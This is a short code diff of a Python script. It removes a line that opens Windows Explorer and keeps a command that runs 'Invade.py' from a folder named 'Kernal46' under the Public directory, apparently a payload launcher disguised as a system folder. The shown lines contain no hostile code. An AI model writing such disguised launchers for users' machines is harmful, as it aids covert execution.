@@ -4,8 +4,6 @@ import random
 import subprocess
 import psutil
 
-subprocess.Popen('explorer')
-
 path = "C:/users/" + os.getlogin() + "/AppData/Local/Programs/Python/Python312/python.exe "
 
 invade = path + 'C:/Users/Public/Kernal46/PythonBased/Invade.py'
